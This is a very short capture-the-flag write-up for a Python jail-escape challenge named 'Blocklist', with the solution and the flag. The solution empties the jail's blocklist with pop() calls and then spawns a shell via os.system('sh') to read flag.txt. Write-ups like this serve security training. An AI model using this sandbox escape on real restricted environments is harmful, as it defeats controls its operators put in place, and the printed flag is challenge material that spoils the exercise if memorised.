### (PWN) Blocklist
Whoops! You were caught stealing and are taken to jail. Can you get out?

### Solution
Clear all values in the ‘blocklist’ with `[blocklist.pop() for i in range(len(blocklist))]` then you can import os;os.system('sh') and `cat flag.txt`

### Flag
CTF{p0p_0ut_0f_j41l}
